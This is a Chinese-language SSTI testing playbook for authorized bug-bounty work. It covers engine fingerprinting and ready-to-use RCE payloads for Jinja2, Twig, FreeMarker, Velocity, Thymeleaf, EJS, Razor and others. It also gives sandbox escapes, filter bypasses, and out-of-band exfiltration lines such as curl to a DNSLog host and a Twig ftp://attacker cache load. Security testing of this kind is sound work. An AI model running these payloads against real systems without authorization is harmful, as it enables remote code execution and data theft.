# SSTI 服务端模板注入（打深篇）

> 定位：`injection-test.md` §SSTI 是**总览与快速检测**（polyglot 三枪 + 各引擎一句 payload），本篇是**打深**：引擎识别 → 沙箱逃逸 → 无回显判定 → 过滤绕过。
> **只在「输入进了模板」的口上用**：总览四枪没差分、且这个参数根本不参与渲染（只进数据库/只做等值查询）→ 本枪 N/A，回去打别的。
> **实战案例（双向引用）**：

> - `cmd-injection-cases.md` §1.4 —— OGNL/SSTI 侧：Struts2 S2-045/046（Content-Type 与上传文件名注入 OGNL）、若依 snakeyaml 定时任务 `!!javax.script.ScriptEngineManager` 加载远程 jar；
> - `code-audit-cases.md` §八 —— 已如实标注「**缺 SSTI/模板注入真实案例（仅理论）**」，即 ima 案例库 1604 份里**没有 SSTI 独立报告**，本篇靠打法与公开手法支撑，别指望案例索引；
> - 表达式语言注入（`SpEL` / `OGNL` / `Java EL`）单独成篇，见 `el-injection-test.md` —— **别把 SpEL 当 SSTI 打**，虽然 `${7*7}` 探针长一样。
>
> 冲突以 `rules/src-value-hunting.md` §3 为准：按栈选探针，不封顶，但**不在无差分面上堆 payload**。

---

## 0. 先决条件：哪些口值得打 SSTI

SSTI 的前提是**用户输入被当作模板源码拼进模板再渲染**，不是"输入被显示出来"。先认「渲染口」，再谈注入。

### 高概率渲染口（按命中率排序）

| 口 | 为什么是模板 | 现场判据 |
|---|---|---|
| **邮件/短信模板** | 内容要拼变量后渲染发送 | 后台有"邮件模板/短信模板/通知模板"编辑框，或预览功能 |
| **导出 / 打印 / 生成 PDF** | PDF 走 HTML 模板 → 渲染引擎 | `export=pdf`、`/preview`、`/print`、发票/合同/报告生成 |
| **自定义页面 / 站点装修 / CMS 主题** | 用户可控的模板片段 | 富文本里能写 `${}` `{{}}`、页面装修、H5 活动页 |
| **报表 / BI** | 表头、单元格表达式 | 报表设计器、自定义公式列 |
| **错误页 / 维护页 / 404 定制** | 模板文件 + 变量插值 | 运维后台能改提示语 |
| **开发者平台 / Webhook 模板** | 回调内容模板化 | `body_template`、`content_template` 字段 |
| **SSR 前端（Nuxt / Next）** | 服务端渲染字符串 | 鲜见，且多为自研，命中率低 |

### 一眼排除

- 参数只做**等值查询 / 数值比较 / 排序键**：回显的是数据不是渲染结果 → 走 `sqli-advanced-test.md` / `idor-test.md`
- 输入被**当作纯文本转义输出**（`<` 变 `&lt;`，`{{}}` 原样回显）→ 渲染引擎没接管，多半是 XSS 面，走 `xss-test.md`
- 站点是纯静态 / 前后端分离且模板在前端（Vue/React 客户端渲染）→ 客户端模板注入（CSTI）算 XSS，**不是本篇**

> **CSTI 与 SSTI 的区分**：`{{7*7}}` 打进去，**查看页面源码**里能看到字面量 `{{7*7}}` 但页面上显示 49 → 前端框架渲染（XSS 面）；**源码里也变成 49** → 服务端渲染（SSTI）。这是最省事的一刀。

---

## 1. 引擎识别

### 1.1 一枪定栈（polyglot 决策树）

```
打 {{7*7}} , ${7*7} , #{7*7} , <%= 7*7 %>  四个探针（分别打，别混在一起）
│
├─ 回 49 → 模板执行了
│   ├─ {{ }} 生效        → Jinja2 / Twig / Nunjucks / Handlebars / Go template / Liquid
│   ├─ ${ } 生效         → FreeMarker / Velocity / Java EL / Groovy / Mako
│   ├─ #{ } 生效         → Thymeleaf(__${}__才执行) / Ruby EL / SpEL
│   └─ <%= %> 生效       → ERB(Ruby) / EJS(Node) / ASP
│
├─ 回 49 但报错 → 看报错类名定栈（见 1.3）
│
└─ 全原样回显 / 全被过滤 → 本枪 N/A，不要磨
```

### 1.2 多引擎区分探针

```text
{{7*'7'}}          → 7777777   = Jinja2(Python) 或 Twig(PHP)
{{7*'7'}}          → 49        = 其它（Nunjucks 等 JS 系）
{{ '7'*7 }}        → 7777777   = Jinja2 / Twig
{{ 7*7 }}          → 49        = 通用
${7*7}             → 49        = FreeMarker / Mako / Velocity
#{7*7}             → 49        = Thymeleaf 需 __#{7*7}__ 预处理才执行
<%= 7*7 %>         → 49        = ERB / EJS
{{ "z".join("ab") }}            → 报错含 join = Jinja2
{{ [1,2]|join(',') }}           → 1,2 = Twig/Liquid（filter 语法）
${"a".concat("b")}              → ab = FreeMarker
```

### 1.3 报错定栈（比探针更快）

| 报错特征 | 引擎 | 语言 |
|---|---|---|
| `jinja2.exceptions.UndefinedError` / `TemplateSyntaxError` | Jinja2 | Python |
| `Twig_Error_Syntax` / `Twig\Error` | Twig | PHP |
| `freemarker.core.InvalidReferenceException` / `ParseException` | FreeMarker | Java |
| `org.apache.velocity.exception.ParseErrorException` | Velocity | Java |
| `org.thymeleaf.exceptions.TemplateProcessingException` | Thymeleaf | Java |
| `ActionView::Template::Error` | ERB | Ruby |
| `SmartyCompilerException` | Smarty | PHP |
| `NameError` + `erb` / `ERB` | ERB | Ruby |
| `mako.exceptions` | Mako | Python |
| `Razor` / `Microsoft.CSharp` | Razor | .NET |

> **报错是白给的指纹**：只要把模板语法写错（如 `{{`），多数引擎会吐出完整堆栈，里面既有引擎名又有版本号，**直接查对应 Nday**，比自己磨沙箱快得多。

---

## 2. 按引擎打（RCE payload）

> **红线**：命令只做无害标记 / `id`（对齐 `agent-tool-exec-test.md`）。SRC 验证台有 flag 的打 flag。

### 2.1 Jinja2（Python / Flask / Django）

```python
# 探测
{{ ''.__class__.__mro__[1].__subclasses__() }}

# RCE（拿 subclasses 下标，逐位试或用脚本找）
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read() }}
# X 常见命中：<class 'os._wrap_close'> 或 subprocess.Popen

# 更稳的写法（不依赖下标）：先取 builtins 再 import
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Flask 特有：拿 config / SECRET_KEY（不 RCE 也够升档）
{{ config.items() }}
{{ config['SECRET_KEY'] }}
{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default }}
```

**沙箱逃逸（SandboxedEnvironment，如 CMS 的自定义模板功能）**：

```python
# 禁了 __class__ / __globals__ 时：走属性访问链
{{ request['__cl'+'ass__'].__mro__[1]['__subcl'+'asses__']() }}
# 或用 attr filter 绕点号过滤
{{ ''|attr('__class__')|attr('__mro__')|list|attr('__getitem__')(1)|attr('__subclasses__')() }}
# 或用 format 字符串读属性
{{ "{0.__class__.__mro__[1].__subclasses__}".format('') }}
```

### 2.2 Twig（PHP / Symfony）

```php
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id']|filter('system') }}
{{ ['id']|map('system')|join }}
{{ ['id']|reduce((carry, item) => carry ~ system(item), '') }}
# 旧版（Twig 1.x）
{{ _self.env.setCache('ftp://attacker/') }}{{ _self.env.loadTemplate('shell') }}
# 只拿信息（不 RCE）
{{ app.request.server.all|join(',') }}
{{ constant('PHP_VERSION') }}
```

### 2.3 FreeMarker（Java）

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
# ObjectConstructor / JythonRuntime（老版本）
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
# New 被禁时走 ClassUtil
<#assign cl="freemarker.template.utility.ClassUtil"?new()>${cl.forName("java.lang.Runtime")}
```

### 2.4 Velocity（Java）

```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
#set($rt=$e.getClass().forName("java.lang.Runtime"))#set($r=$rt.getRuntime())$r.exec("id")
# ClassTool（VelocityTools 存在时，最省事）
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
```

### 2.5 Thymeleaf（Java / Spring）

Thymeleaf 的 `#{...}` 默认**不执行表达式**，要触发得靠**预处理** `__${...}__` 或特定 Nday：

```java
__${T(java.lang.Runtime).getRuntime().exec("id")}__
# 或变量表达式（部分配置下）
${T(java.lang.Runtime).getRuntime().exec('id')}
# 已知 Nday：Spring View 名拼接（CVE-2016-4977 等）→ 参数进 viewName 即执行
```

> Thymeleaf 手工打成功的多半是**业务拼接了视图名**（`return prefix + userInput`），认这个模式比磨 payload 有用。

### 2.6 其它引擎速查

| 引擎 | RCE / 关键 payload |
|---|---|
| **Pug / Jade**（Node） | `#{function(){return global.process.mainModule.require('child_process').execSync('id')}()}` |
| **EJS**（Node） | `<%= global.process.mainModule.require('child_process').execSync('id') %>` |
| **ERB**（Ruby） | `<%= \`id\` %>` / `<%= system('id') %>` / `<%= IO.popen('id').read %>` |
| **Smarty**（PHP） | `{system('id')}` / `{$smarty.version}` / `{php}echo \`id\`;{/php}`（Smarty2） |
| **Mako**（Python） | `<%import os%>${os.popen('id').read()}` |
| **Tornado**（Python） | `{% import os %}{{ os.popen('id').read() }}` |
| **Go html/template** | 默认**无 RCE**（自动转义且无反射调用），只能信息泄露；打不动就 N/A |
| **Handlebars / Mustache** | 设计上**无 RCE**（无逻辑模板），只能信息泄露/原型链配合；打不动就 N/A |
| **Razor**（.NET） | `@System.Diagnostics.Process.Start("cmd","/c id")` |
| **Liquid**（Shopify 系） | 沙箱严格，多半只能信息泄露 |

> **Handlebars / Go / Liquid 打不出 RCE 是正常的**，别磨。它们能出的是**信息泄露**（`{{config}}`、`{{settings}}`、环境变量），按 `info-leak-test.md` 写。

---

## 3. 无回显 / 盲判定

模板执行了但结果不显示（写入邮件正文、进 PDF、异步任务）：

```text
# 1) DNSLog / OOB（最稳）
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('curl http://<dnslog>/`id`').read() }}
${"freemarker.template.utility.Execute"?new()("nslookup <dnslog>")}

# 2) 时间盲（无外网时用）
{{ ''.__class__...popen('sleep 5').read() }}
{% import os %}{{ os.popen('sleep 5').read() }}

# 3) 写文件到 web 目录再访问（次选，注意留痕）
{{ ... popen('id > /var/www/html/static/x.txt') }}

# 4) 差分判定（连命令都跑不了时）：用纯表达式制造可观测差异
{{ 'a' if 1==1 else 'b' }}     → 回 a 说明表达式被求值（不是 RCE，只是 SSTI 确认）
{{ config.items()|length }}    → 数字变化即可确认
```

> **能确认 SSTI 但打不出 RCE 时，别硬磨**：信息泄露（`config` / `SECRET_KEY` / 环境变量 / 绝对路径 / 内部主机名）往往已经是中危，按 `info-leak-test.md` 写即可。

---

## 4. 过滤绕过

| 拦什么 | 绕过 |
|---|---|
| 关键字 `class` / `globals` / `os` / `popen` | 字符串拼接：`__cl`+`ass__`；或用 `request.args` 传参：`{{ ''[request.args.a] }}&a=__class__` |
| 点号 `.` | `{{ ''\|attr('__class__') }}` / `{{ ''['__class__'] }}` |
| 中括号 `[` `]` | `{{ ''.__class__.__mro__\|list\|attr('__getitem__')(1) }}` |
| 下划线 `_` | `{{ ''[request.args.a][request.args.b] }}&a=__class__&b=__mro__`；或十六进制/Unicode 编码 |
| 引号 `'` `"` | `{{ [].__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[request.args.o].popen(request.args.c).read() }}&o=os&c=id` |
| `{{` `}}` 被拦 | 换引擎语法：`${}` `#{}` `<%%>`；或换行/制表符插入 `{\n{7*7}\n}` |
| 长度限制 | 用 `request.args` / `request.cookies` 外带 payload（上面几种都是这个思路） |
| WAF | 见 `waf-bypass.md`；SSTI 主要是**形态变形**（换等价 API）而非编码 |

---

## 5. 假点

- **`{{7*7}}` 回 49 但源码里是前端算的** → CSTI/XSS，不是 SSTI
- **输入被当作字符串拼进 SQL 而回显** → 是 SQL 注入面
- **只回显字面量 `{{7*7}}`** → 模板没接管，本枪 N/A
- **沙箱环境**（CMS 自定义模板、在线代码沙箱）→ 打不出 RCE 属预期，能出信息泄露就收手
- **报错里出现引擎名但输入点不进模板**（如报错页模板名泄露）→ 只是指纹，不是漏洞
- **Python 沙箱里 `popen` 返回空** → 命令被容器限制/无 sh，先试 `/bin/sh -c` 或换 `subprocess`，别判成没洞

---

## 6. 红线（对齐 `rules/vuln-report-format.md` 与 SKILL.md 安全红线）

- 命令只做**无害标记 / `id` / SRC 验证台 flag**，不读业务数据、不拖库、不留马；
- 拿不到命令执行时，`config` / `SECRET_KEY` 这类**只证明可读即可**，不要拿来伪造他人会话；
- 写文件验证后**自己清掉**；
- 不因为"打了 SSTI"就顺手做免杀/持久化——那是红队活，SRC 一律不做（对齐 `attack-chain-cases.md` §0）。

---

## 7. 自检（本篇）

- [ ] 先确认这个参数**真的进模板**（有渲染口），而不是只进数据库？
- [ ] 四探针分别打过，记录每个的回显？
- [ ] 报错里**抓到引擎名与版本**了吗？查过对应 Nday？
- [ ] 是 SSTI 还是 CSTI（查页面源码区分）？
- [ ] 打不出 RCE 时，转信息泄露写了没？还是还在磨沙箱？
- [ ] 命令只用了 `id` / 标记 / flag？
- [ ] 写文件验证的**清干净了**？

---

## 8. 一句话

**认「渲染口」（邮件/导出/装修/报表/PDF）→ 四探针定引擎 → 报错抓指纹查 Nday → 能 RCE 打 `id`，打不动就转信息泄露收手；Handlebars/Go/Liquid 打不出 RCE 是设计使然，别磨。**
